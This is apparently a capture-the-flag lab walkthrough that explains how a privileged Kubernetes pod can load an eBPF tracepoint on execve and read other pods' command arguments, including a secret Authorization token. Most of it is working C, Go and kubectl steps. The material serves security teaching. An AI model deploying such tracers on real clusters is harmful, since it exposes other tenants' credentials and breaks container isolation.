# Official Walkthrough: Project Hydra

This lab demonstrates how overly permissive Pod security contexts can be abused to break container isolation. Even though you are restricted to the default namespace via Kubernetes RBAC, the underlying Linux kernel is shared across all pods on the node. By deploying an eBPF tracepoint, you can spy on system calls across the entire cluster.

## Step 1: Access the Environment

First, you need to access the development environment. 
1. SSH into your assigned VM or use the cloud console to connect.
2. View the password for the Web IDE by running `cat ~/.config/code-server/config.yaml`.
3. Open your browser and navigate to `http://<VM_IP>:8080`.
4. Log in using the password you retrieved and open a new terminal within the VS Code interface.

## Step 2: Complete the eBPF Tracepoint

Navigate to the scanner directory: `cd ~/project-hydra/scanner`. 

Your goal is to intercept the command-line arguments passed to the `execve` syscall. The provided `trace.c` file already captures the filename being executed, but you need the arguments to see the secret token.

Open `trace.c` and replace the FIXME section with the following C code to extract the arguments from the `argv` array:

```c
    // ctx->args[1] holds the pointer to the argv array
    const char **argv = (const char **)BPF_CORE_READ(ctx, args[1]);
    const char *arg_ptr;
    int offset = 0;

    // Loop through the first few arguments
    #pragma unroll
    for (int i = 0; i < 8; i++) {
        bpf_probe_read_user(&arg_ptr, sizeof(arg_ptr), &argv[i]);
        if (!arg_ptr) break;
        
        // Read the string from user space into our event struct
        int len = bpf_probe_read_user_str(&ev.args[offset], sizeof(ev.args) - offset, arg_ptr);
        if (len > 0) {
            offset += len;
            if (offset >= sizeof(ev.args) - 1) break;
            ev.args[offset - 1] = ' '; // Separate arguments with a space
        }
    }
```

Next, open `main.go` and scroll to the bottom. Uncomment the print statement so your Go wrapper actually prints the arguments it receives from the kernel:

```go
fmt.Printf("ARGS: %s\n", string(event.Args[:]))
```

## Step 3: Build and Deploy the Scanner

Now you need to compile your eBPF program and package it into a Docker container. Run the following command in the `scanner` directory:

```bash
docker build -t security-scanner:latest .
```

Because the lab runs inside a Kind (Kubernetes in Docker) cluster, the Kubernetes nodes cannot see the image you just built on the host. You have to push it directly into the Kind cluster:

```bash
kind load docker-image security-scanner:latest --name project-hydra
```

Once the image is loaded, deploy your malicious pod into the cluster:

```bash
kubectl apply -f deploy.yaml
```

## Step 4: Capture the Flag

Your scanner is now running with the `privileged: true` security context. This grants it the `CAP_BPF` capability, allowing it to load your program into the host kernel and trace all execution events cluster-wide.

Follow the logs of your scanner pod:

```bash
kubectl logs -f security-scanner
```

Wait for about 30 seconds. You will see various system processes executing, but eventually, you will see a `curl` command executed by the administrator pod in the `kube-system` namespace. Look closely at the arguments printed in the log output, and you will find the Authorization header containing the flag.
